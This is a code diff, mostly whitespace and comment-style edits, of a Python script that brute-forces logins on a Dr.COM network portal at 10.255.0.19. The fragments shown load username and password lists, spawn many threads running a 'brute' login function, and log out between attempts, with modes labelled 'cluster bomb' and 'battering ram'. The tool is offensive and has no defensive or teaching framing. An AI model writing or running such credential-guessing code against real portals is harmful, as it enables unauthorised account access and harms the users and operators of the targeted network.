@@ -2,6 +2,7 @@ import json
 import re
 import threading
 import time
+
 import requests
 
 file1 = open('username.txt', mode='r', encoding='utf-8')
@@ -39,7 +40,7 @@ def brute(session, username: str, password: str):
             session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
 
 
-def choose_mode(mode:int):
+def choose_mode(mode: int):
     dic_username = dump_username()
     dic_password = dump_password()
     session = requests.session()
@@ -55,7 +56,7 @@ def choose_mode(mode:int):
             for password in dic_password:
                 t = threading.Thread(target=brute, args=(session, username, dic_password[i]))
                 i += 1
-                #设置轮回数
+                # 设置轮回数
                 if i == 122:
                     for j in range(i):
                         dic_password.pop(0)
@@ -68,9 +69,9 @@ def choose_mode(mode:int):
             dic_password.pop(0)
             t.start()
             time.sleep(0.005)
-     
+
 
 if __name__ == '__main__':
-    #mode=1,2:cluster bomb
-    #mode=3:battering ram
+    # mode=1,2:cluster bomb
+    # mode=3:battering ram
     choose_mode(1)
